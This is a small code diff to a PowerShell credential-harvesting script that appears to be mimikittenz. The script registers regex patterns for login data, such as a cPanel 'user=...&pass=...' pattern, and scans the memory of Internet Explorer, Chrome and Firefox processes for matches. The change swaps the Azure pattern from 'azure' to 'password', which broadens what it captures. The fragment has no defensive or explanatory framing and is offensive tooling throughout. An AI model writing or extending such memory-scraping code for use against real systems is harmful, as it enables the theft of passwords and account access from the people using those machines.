@@ -529,7 +529,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
     #Azure
-    [mimikittenz.MemProcInspector]::AddRegex("Azure","azure")
+    [mimikittenz.MemProcInspector]::AddRegex("Azure","password")
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
 
